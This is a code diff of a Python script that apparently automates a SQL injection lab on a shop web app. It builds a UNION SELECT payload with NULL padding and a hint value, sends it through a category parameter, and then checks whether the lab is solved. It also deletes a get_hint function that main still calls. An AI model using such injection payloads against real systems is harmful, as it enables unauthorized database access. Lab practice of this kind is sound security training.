@@ -20,14 +20,6 @@ logging.basicConfig(
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
-def get_hint(url, no_proxy):
-    log.info("Getting hint")
-    resp = requests.get(url)
-    pattern = re.compile(r'id="hint">.*?: \'(.*?)\'')
-    m = pattern.search(resp.text)
-    log.info(f"Found hint: {m[1]}")
-    return m[1]
-
 def main(args):
     shop = Shop(args.url, args.no_proxy)
     hint = get_hint(shop.base_url, shop.no_proxy)
@@ -59,11 +51,12 @@ def main(args):
     
     nulls_list = ["NULL"] * num_columns
     nulls_list[text_columns[0]] = f"'{hint}'"
+    nulls = ",".join(nulls_list)
+         
     category = f"' UNION SELECT {nulls}-- "
     resp = shop.get_category(category)
     if resp.status_code == 200:    
         shop.is_solved()
-    #29 10
     
     
 if __name__ == "__main__":
